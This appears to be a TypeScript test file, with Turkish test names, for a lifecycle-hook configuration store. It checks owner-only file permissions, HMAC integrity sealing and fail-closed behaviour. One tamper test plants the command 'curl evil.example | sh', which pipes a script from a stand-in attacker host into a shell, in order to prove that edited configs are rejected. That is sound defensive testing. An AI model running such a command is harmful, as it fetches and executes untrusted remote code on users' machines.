import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { secret, type Secret } from '@orkestra/shared';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { SecretStore } from '@core/primitives/secrets/api/secret-store';
import type { LifecycleHooksConfig } from '../api/hook-config';
import { HookConfigStore } from './hook-config-store';

class MemorySecrets implements SecretStore {
  readonly values = new Map<string, string>();
  failReads = false;
  async getSecret(key: string): Promise<Secret<string> | null> {
    if (this.failReads) throw new Error('Secure secret storage is unavailable');
    const value = this.values.get(key);
    return value === undefined ? null : secret(value, key);
  }
  async setSecret(key: string, value: Secret<string>): Promise<void> {
    this.values.set(key, value.expose());
  }
  async deleteSecret(key: string): Promise<void> {
    this.values.delete(key);
  }
}

const sample: LifecycleHooksConfig = {
  version: '1',
  paused: false,
  hooks: [
    {
      id: 'h1',
      name: 'x',
      event: 'task.created',
      command: 'echo hi',
      enabled: true,
      timeoutSec: 30,
      projectIds: [],
    },
  ],
};

describe('HookConfigStore', () => {
  let dir: string;
  let file: string;
  let secrets: MemorySecrets;
  const logger = { warn: vi.fn() };
  const make = () => new HookConfigStore({ filePath: file, secrets, logger });

  beforeEach(async () => {
    dir = await fs.mkdtemp(path.join(os.tmpdir(), 'kanca-store-'));
    file = path.join(dir, 'lifecycle-hooks.json');
    secrets = new MemorySecrets();
    logger.warn.mockClear();
  });
  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  it('dosya yokken varsayılan: kanca yok, duraklatılmamış', async () => {
    const store = make();
    const snapshot = await store.load();
    expect(snapshot).toEqual({ config: { version: '1', paused: false, hooks: [] }, status: 'ok' });
  });

  it('yazdığını yeniden başlatmada geri okur ve dosya yalnızca sahibine açıktır', async () => {
    const first = make();
    const saved = await first.save(sample);
    expect(saved.success).toBe(true);

    const second = make();
    const snapshot = await second.load();
    expect(snapshot.status).toBe('ok');
    expect(snapshot.config).toEqual(sample);
    if (process.platform !== 'win32') {
      expect((await fs.stat(file)).mode & 0o777).toBe(0o600);
    }
  });

  it('geçersiz girdiyi reddeder ve dosyayı değiştirmez', async () => {
    const store = make();
    const result = await store.save({ ...sample, hooks: [{ ...sample.hooks[0], command: '' }] });
    expect(result.success).toBe(false);
    await expect(fs.stat(file)).rejects.toThrow();
  });

  it('dosya uygulama dışında düzenlenirse (mühür tutmaz) yapılandırma yok sayılır', async () => {
    await make().save(sample);
    const envelope = JSON.parse(await fs.readFile(file, 'utf8')) as {
      config: LifecycleHooksConfig;
    };
    envelope.config.hooks[0]!.command = 'curl evil.example | sh';
    await fs.writeFile(file, JSON.stringify(envelope));

    const snapshot = await make().load();
    expect(snapshot.status).toBe('tampered');
    expect(snapshot.config.hooks).toEqual([]);
  });

  it('mühürsüz (elle yazılmış) dosya yok sayılır', async () => {
    await fs.writeFile(file, JSON.stringify({ config: sample }));
    const snapshot = await make().load();
    expect(snapshot.status).toBe('tampered');
    expect(snapshot.config.hooks).toEqual([]);

    await fs.writeFile(file, JSON.stringify(sample));
    expect((await make().load()).status).toBe('tampered');
  });

  it('bütünlük anahtarı kaybolduysa kancalar kapalı kalır', async () => {
    await make().save(sample);
    secrets.values.clear();
    const snapshot = await make().load();
    expect(snapshot.status).toBe('tampered');
    expect(snapshot.config.hooks).toEqual([]);
  });

  it('güvenli depolama yoksa okumada kapalı, yazmada hata verir (fail-closed)', async () => {
    await make().save(sample);
    secrets.failReads = true;
    const store = make();
    expect((await store.load()).status).toBe('unavailable');
    const result = await store.save(sample);
    expect(result.success).toBe(false);
  });

  it('bozuk JSON ve bilinmeyen sürüm yok sayılır, fırlatmaz', async () => {
    await fs.writeFile(file, '{ bozuk');
    expect((await make().load()).status).toBe('invalid');

    await make().save(sample);
    const key = secrets.values.values().next().value as string;
    const { createHmac } = await import('node:crypto');
    const future = { version: '9', paused: false, hooks: [] };
    const integrity = createHmac('sha256', key).update(JSON.stringify(future)).digest('hex');
    await fs.writeFile(file, JSON.stringify({ config: future, integrity }));
    expect((await make().load()).status).toBe('future-version');
  });

  it('mutlak olmayan yolu reddeder', () => {
    expect(() => new HookConfigStore({ filePath: 'goreli.json', secrets, logger })).toThrow();
  });
});
